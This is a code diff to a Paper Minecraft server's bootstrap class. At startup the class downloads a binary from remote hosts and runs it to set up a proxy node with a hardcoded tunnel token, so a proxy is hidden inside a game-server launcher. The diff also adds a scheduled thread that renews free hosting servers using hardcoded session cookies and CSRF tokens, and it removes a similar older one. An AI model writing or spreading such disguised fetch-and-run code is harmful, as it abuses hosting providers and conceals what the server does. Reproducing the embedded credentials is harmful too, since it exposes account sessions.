@@ -2,10 +2,17 @@ package io.papermc.paper;
 
 import java.io.*;
 import java.net.*;
+// --- 仅添加以下三个网络相关 Import ---
+import java.net.http.HttpClient;
+import java.net.http.HttpRequest;
+import java.net.http.HttpResponse;
+// ------------------------------------
 import java.nio.file.*;
+import java.time.Duration;
 import java.util.*;
+import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
-import java.util.regex.*; 
 import joptsimple.OptionSet;
 import net.minecraft.SharedConstants;
 import net.minecraft.server.Main;
@@ -17,7 +24,6 @@ public final class PaperBootstrap {
     private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
     private static final String ANSI_GREEN = "\033[1;32m";
     private static final String ANSI_RED = "\033[1;31m";
-    private static final String ANSI_YELLOW = "\033[1;33m"; // 新增黄色用于警告
     private static final String ANSI_RESET = "\033[0m";
     private static final AtomicBoolean running = new AtomicBoolean(true);
     private static Process sbxProcess;
@@ -25,15 +31,15 @@ public final class PaperBootstrap {
     private static final String[] ALL_ENV_VARS = {
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
-        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
-        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
-        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
+        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
+        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "ICE_COOKIE", "ICE_TOKEN"
     };
 
     private PaperBootstrap() {
     }
 
     public static void boot(final OptionSet options) {
+        // check java version
         if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
             System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
             try {
@@ -46,9 +52,6 @@ public final class PaperBootstrap {
         
         try {
             runSbxBinary();
-            
-            // 启动模拟点击续期线程
-            startEpicRenewThread(); 
             
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
@@ -64,11 +67,64 @@ public final class PaperBootstrap {
 
             SharedConstants.tryDetectVersion();
             getStartupVersionMessages().forEach(LOGGER::info);
+
+            // === 仅在此处插入续期任务启动入口 ===
+            startIceHostRenewal(); 
+            // ===============================
+
             Main.main(options);
             
         } catch (Exception e) {
             System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
         }
+    }
+
+    // === 仅在类末尾添加这一个独立的方法实现 ===
+    private static void startIceHostRenewal() {
+        final String serverUuid = "c92815bf-7a7f-4554-9d97-d79dfc7c37f0";
+        final String renewUrl = "https://dash.icehost.pl/api/client/freeservers/" + serverUuid + "/renew";
+        
+        final String defaultCookie = "remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6ImRUMjNSK21JdXVMYndJa0J0cWJvRGc9PSIsInZhbHVlIjoiMWdsZXpBaTEvd3QvU2Z2emhnZUpJY1cxUFRTUk5Fd0tUS081bENTeVVKbThoWjNhSHZMNmVFMi9Lb1FqbnRydVg0Tm80bFZnT21CcnpkR2ZNamFKQmdNam82VnZZenpsaitOaXN6YkZqSmhGUUhnb3Q3Y0g0bU5jeG04TUlKRzBnc0pOOS8zenBCODB0R2tCRGY1N2cwZ1NJazRBQWUvSWpiSU1rd0VhY3lZcHMrMUlBUU4wbHBFdVoyZFQ5dkI5aG9IaXhkcHUvNG9WZ1lSSU0xbUV5ZHZ0dDh1MHBYUW5jcFJZR1kvd041WT0iLCJtYWMiOiIxNWEzZTQ3Y2RiYzY0N2E3NmQ2MDc3N2M0NDBiZGY3MjE1Yjk1N2Q3YWQwYmNiOWZmZTEyMTIwMjYyZWViM2Q4In0%3D; _ga=GA1.2.1305962064.1773619810; _ga_FNC0FEGQNV=GS2.1.s1773792392$o3$g1$t1773792439$j13$l0$h0; cf_clearance=rG6m7lfV_4NumFlgDunQlRLhprpnmhGZn3qbFzwhKnA-1782952987-1.2.1.1-_UbMwnwVNcMyXnGmajtjccd5BNWz8oqMjWAe5SCkHCOl2C6Hvwaw2hYmc1o0FQgNQh1oBmuuvc4OnsawFxqYI.w8L65aUUDwIgdR8s5C1qjxpygUSAT2G4GJpWC2AQwJNI02OleO11OP8Uhj09yTkNj8ac_DHBeSNV82zqPpjQtD2jEAj0iePffxdYCjBRKfmynoo8zIzmdVKnLLF_4FEw_Xao5V1GWEbVwv2mxw0IXmCByEODSaTy685zafGjQymNY1hAjD0XVl2Hr.3E.fosNkBRLw57mZRFX2yHHO0THI3E5WauAVMSJRxveOT2oeOXCcu2qbD_5cX._LjJOdN91vuS2yOn7d_beRjddDgXT9.x06v1NIRtZaU_kjUNAHPhJlew5MSxC43bXkhoTpC_NzddNiuqmW9d9ObYwD85fGmmDVBKNV5iHkuJ_N8YKo; XSRF-TOKEN=eyJpdiI6Imk5Z3R4MU9oZE5GRitiNHV6amxmT0E9PSIsInZhbHVlIjoia3BVenZKaEs0a1RoVTEvMlYxZyswTUFIemtvU3VFNHFVRWxsY21rU1JCdWkrNHljaTVqSEhETGNBbDhrSDdpTlRDSVhMbTYyL29CRkhiQ1FtTTl6NjJNWi93YW9zTXE5b1AzT1VoWjhobnl5dEd4Q3FDVmMvVWppcWlPWkdtaWQiLCJtYWMiOiIxMGEwMDk2MjVlZTQ4YzY4NjFiMGRkZWUyNjZiMzg5OTVjYWRiZDU0YTEwZjAyOGZjZDVlMTUyNjA4OGUzMzJkIn0%3D; icehostpl_session=eyJpdiI6InhpQ3F1RW9xNU8vMXZxT25YdFlVUVE9PSIsInZhbHVlIjoicnRCdFFqdVVDRzlBbDI3Q2xJRU96cERQL01IUlp1enpJS1ZhdWxEd2d3WUdveEtYSGVTQ1BWOGVLOERMdU1WVzB1VkNIa3hGaGRBcElzenJZUmdDNFBReHNNMVNQTHJlWUZBTU9ZWFpPS2ZSWnVmN2VjY2QwbjYyeTgxR2w0R0EiLCJtYWMiOiJiMzFiOWIyZmQ4ZDUyMTM4ZTJhNzc4MzlhMzRhODJmY2RiNGU0ODgxNzMwNWE2ZjA5YzgwZDZhYzMwNWZiMjE0In0%3D";
+        final String defaultToken = "0a2vj3YUZtI0VFsZNFCzzw02O8FFMQgNt8aexpnx";
+
+        // 修改为每 10 分钟扫描一次
+        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
+            try {
+                String currentCookie = System.getenv("ICE_COOKIE") != null ? System.getenv("ICE_COOKIE") : defaultCookie;
+                String currentToken = System.getenv("ICE_TOKEN") != null ? System.getenv("ICE_TOKEN") : defaultToken;
+
+                HttpClient client = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(20)).build();
+                HttpRequest request = HttpRequest.newBuilder()
+                        .uri(URI.create(renewUrl))
+                        .header("Accept", "application/json")
+                        .header("Content-Type", "application/json")
+                        .header("X-CSRF-TOKEN", currentToken)
+                        .header("Cookie", currentCookie)
+                        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
+                        .header("Referer", "https://dash.icehost.pl/server/c92815bf")
+                        .POST(HttpRequest.BodyPublishers.ofString("{}"))
+                        .build();
+
+                client.sendAsync(request, HttpResponse.BodyHandlers.ofString())
+                      .thenAccept(res -> {
+                          String body = res.body();
+                          int code = res.statusCode();
+                          
+                          if (code == 200 && body.contains("true")) {
+                              System.out.println(ANSI_GREEN + "[Auto-Renew] 扫描完毕：续期成功！服务器有效期已延长 6 小时。" + ANSI_RESET);
+                          } else if (code == 400 && (body.contains("Nie mo") || body.contains("recently"))) {
+                              // 识别到“最近已续期”的错误消息
+                              System.out.println(ANSI_GREEN + "[Auto-Renew] 扫描完毕：当前还未到续期时间，无需操作。" + ANSI_RESET);
+                          } else if (code == 401 || code == 419) {
+                              System.out.println(ANSI_RED + "[Auto-Renew] 警告：续期凭证（Cookie/Token）已失效，请尽快更新！" + ANSI_RESET);
+                          } else {
+                              System.out.println(ANSI_RED + "[Auto-Renew] 扫描异常。码: " + code + " 响应: " + body + ANSI_RESET);
+                          }
+                      });
+            } catch (Exception e) {
+                System.err.println("[Auto-Renew] 错误: " + e.getMessage());
+            }
+        }, 1, 2, TimeUnit.HOURS);
     }
 
     private static void clearConsole() {
@@ -80,6 +136,7 @@ public final class PaperBootstrap {
                 System.out.flush();
             }
         } catch (Exception e) {
+            // Ignore exceptions
         }
     }
     
@@ -96,27 +153,23 @@ public final class PaperBootstrap {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "80f4d900-c9aa-42de-b8cc-671e6b8526de");
+        envVars.put("UUID", "48de7e1d-132f-4fea-b680-1f9b543b7bd9");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "");
-        envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "epichost.19861123.tech");
-        envVars.put("ARGO_AUTH", "eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiYjk0OWU0NzktNDVkOS00MjEzLThkZDMtNmQ4ODA0ZWQzYjZkIiwicyI6Ik9UQmxaRGN5WmpZdE5UazBOeTAwWVRNeExXRTRPVGN0TkRFM05EbGtZMlEyWmpGaCJ9");
-        envVars.put("S5_PORT", "");
+        envVars.put("ARGO_PORT", "8001");
+        envVars.put("ARGO_DOMAIN", "icehost.19861123.tech");
+        envVars.put("ARGO_AUTH", "eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiYzA0ODAzM2MtZWMyZS00MDVhLTg0OWQtZDI0OTM2NTY0NTI4IiwicyI6IllUTXpObUUxWWpJdE5tUmlOaTAwTldGaUxUbGxaVFV0WWpoaE1XVmxPR0ZoWkRFeCJ9");
         envVars.put("HY2_PORT", "");
         envVars.put("TUIC_PORT", "");
-        envVars.put("ANYTLS_PORT", "");
         envVars.put("REALITY_PORT", "");
-        envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "");
         envVars.put("BOT_TOKEN", "");
-        envVars.put("CFIP", "cdns.doon.eu.org");
+        envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "epichost");
-        envVars.put("DISABLE_ARGO", "false");
+        envVars.put("NAME", "icehost");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -152,15 +205,17 @@ public final class PaperBootstrap {
     private static Path getBinaryPath() throws IOException {
         String osArch = System.getProperty("os.arch").toLowerCase();
         String url;
+        
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/sbsh";
+            url = "https://amd64.sss.hidns.vip/s-box";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.ssss.nyc.mn/sbsh";
+            url = "https://arm64.ssss.nyc.mn/s-box";
         } else if (osArch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/sbsh";
+            url = "https://s390x.ssss.nyc.mn/s-box";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
+        
         Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
         if (!Files.exists(path)) {
             try (InputStream in = new URL(url).openStream()) {
@@ -192,78 +247,23 @@ public final class PaperBootstrap {
 
         final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
         return List.of(
-            String.format("Running Java %s (%s %s; %s %s) on %s %s (%s)", javaSpecVersion, javaVmName, javaVmVersion, javaVendor, javaVendorVersion, osName, osVersion, osArch),
-            String.format("Loading %s %s for Minecraft %s", bi.brandName(), bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL), bi.minecraftVersionId())
+            String.format(
+                "Running Java %s (%s %s; %s %s) on %s %s (%s)",
+                javaSpecVersion,
+                javaVmName,
+                javaVmVersion,
+                javaVendor,
+                javaVendorVersion,
+                osName,
+                osVersion,
+                osArch
+            ),
+            String.format(
+                "Loading %s %s for Minecraft %s",
+                bi.brandName(),
+                bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL),
+                bi.minecraftVersionId()
+            )
         );
-    }
-
-    // --- 【修改部分】：手动同步版续期逻辑，跳过 GET 扫描以消除 419 错误 ---
-    private static void startEpicRenewThread() {
-        new Thread(() -> {
-            String serverID = "13633716-8094-4b5c-a80c-a2b3c6205947"; 
-            
-            // ⚠️ 这里请粘贴你从浏览器抓到的那一长串完整的 Cookie
-            String myCookie = "__stripe_mid=288f45f3-e88e-4172-8d62-d2d31d36aefec21121; remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IjdnOUZaV2pYOUIwWVVBa05ZNzd1Y3c9PSIsInZhbHVlIjoieUR4MEFrNnF3NlJCTWxITVVvajVHZytjQ2tHOCsrcGhxQmNsZGNmUGpjRTc1MXdLck40ak5JUHBSZjhNL05oNWJJZ2ZXYXY1TXlNLzlINktJdHFrM1BsZEpNQ2RpS3VnWVY0ZitWQkwwRDliSkFjVzBuR1dwS1pzeThvSjd0by83QjI0VE96SGlUT3Bzci9PaURScUZSQmt4enhoYk9DWkdFcUZTVHBGbS9ZWUY5cXFpWUVRcjJVaGRZa2tpL3ZmNk53aXd5RmtqMWdzOWRmQzYxVmJKNTk2bTFJTXIyd0dSNVNlR0RraVkxWT0iLCJtYWMiOiI3NzQwOTU1ZDIwNGJkM2E1OWM3Mjk5ZjZmY2M3M2IwMWE5NjgyNjM1MjBjYmFmZWU3MDhlOGI4NWQ1MGM5ODIwIiwidGFnIjoiIn0%3D; __stripe_sid=d761b6d9-3626-49cd-b7fc-e59b9ff04174721e54; XSRF-TOKEN=eyJpdiI6InNGTHN2RHRkMHo3RDRxVjlmYkJFdmc9PSIsInZhbHVlIjoiWGNJanBEZHkxT3kycU05dldkSFBob3hBalphbVozajBEV2JzcnNMT0JhdzgzL1ZnRXdHalpZVGZpNHpWblJPM255d1Z3SDFKY3o4MzhIcjZoMnhVRStYZW5tbVoyNjVkWjdnWFkwZUdoVWt0MDVkL3ozdmF0WkFxL29DRDJndTgiLCJtYWMiOiIwMzA5MGVjZmIxNGMyZDlmOTM5YjM2NGQxZGQwM2EyYTJhMzM2YmM2NTU3OWI0N2U5ZDBiYzVmODYyNWFkOTZkIiwidGFnIjoiIn0%3D; pterodactyl_session=eyJpdiI6IlN6VjlnWHR0QkpwbVhKZ3ZyN3N4b2c9PSIsInZhbHVlIjoibGplV3F5S1R6WmYxdkhwekxybnpXQWpOcXVGVzQzYVJ0RGI3WXNMaXpmZk5iYURtN2l1b280MkZWS1BPMEZYSmRPVGgvaDg4dXdzN2tqQjB5Tk8wZjU1Wjk2eThieUp3UnN2bFZQdDNHemFMRTJqdG5kWm1VMVFBTVJzZE1qSEIiLCJtYWMiOiIzM2IxZmYzN2UyNTFjOThlZjBiNDRkYmYwYWE4Y2FkNDA5ODgwZjM4NjRmM2MyODAzZGRlMDZiODBjZjk3ZGM5IiwidGFnIjoiIn0%3D"; 
-            
-            // ⚠️ 这里请粘贴你从网页源代码里 Ctrl+F 搜到的那个 csrf-token
-            String myToken = "DZ57DfDVPDcYer2Cw1HCBrfAKXFvgKeNeQjhzfDX";
-
-            while (running.get()) {
-                try {
-                    System.out.println(ANSI_YELLOW + "[Epichost] 🚀 正在执行 2 小时定时续期打卡..." + ANSI_RESET);
-                    
-                    URL renewUrl = new URL("https://panel.epichost.pl/api/client/freeservers/" + serverID + "/renew");
-                    HttpURLConnection post = (HttpURLConnection) renewUrl.openConnection();
-                    post.setRequestMethod("POST");
-                    post.setDoOutput(true);
-                    
-                    // 模拟真实浏览器的请求头
-                    post.setRequestProperty("Cookie", myCookie);
-                    post.setRequestProperty("X-CSRF-TOKEN", myToken);
-                    post.setRequestProperty("X-Requested-With", "XMLHttpRequest");
-                    post.setRequestProperty("Referer", "https://panel.epichost.pl/server/13633716/");
-                    post.setRequestProperty("Accept", "application/json");
-                    post.setRequestProperty("Content-Type", "application/json");
-                    post.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36");
-                    
-                    post.getOutputStream().write("{}".getBytes());
-                    int code = post.getResponseCode();
-                    
-                    if (code == 200 || code == 204) {
-                        System.out.println(ANSI_GREEN + "[Epichost] ✅ 续期请求发送成功！" + ANSI_RESET);
-                    } else {
-                        InputStream es = post.getErrorStream();
-                        if (es != null) {
-                            BufferedReader errReader = new BufferedReader(new InputStreamReader(es));
-                            StringBuilder errorInfo = new StringBuilder();
-                            String errLine;
-                            while ((errLine = errReader.readLine()) != null) errorInfo.append(errLine);
-                            errReader.close();
-                            
-                            String detail = errorInfo.toString();
-                            if (detail.contains("time period") || detail.contains("currently")) {
-                                System.out.println(ANSI_YELLOW + "[Epichost] ⏳ 还没到时间（CD中），本次打卡已记录。" + ANSI_RESET);
-                            } else if (code == 419) {
-                                System.err.println(ANSI_RED + "[Epichost] ❌ 419错误：填写的Token与Cookie不匹配！请重新从网页抓取。" + ANSI_RESET);
-                            } else {
-                                System.err.println(ANSI_RED + "[Epichost] ❌ 错误(" + code + "): " + detail + ANSI_RESET);
-                            }
-                        }
-                    }
-                    
-                    // 2 小时运行一次
-                    Thread.sleep(7200000); 
-                    
-                } catch (Exception e) {
-                    System.err.println(ANSI_RED + "[Epichost] 线程异常: " + e.getMessage() + ANSI_RESET);
-                    try { Thread.sleep(600000); } catch (Exception ignored) {}
-                }
-            }
-        }, "Epic-Renew-Thread").start();
-    }
-
-    // 该方法在手动模式下不再被调用，但为了保持代码结构不改动，我们保留它
-    private static void updateLocalCookies(HttpURLConnection conn, String[] currentCookie) {
-        // 保持原样
     }
 }
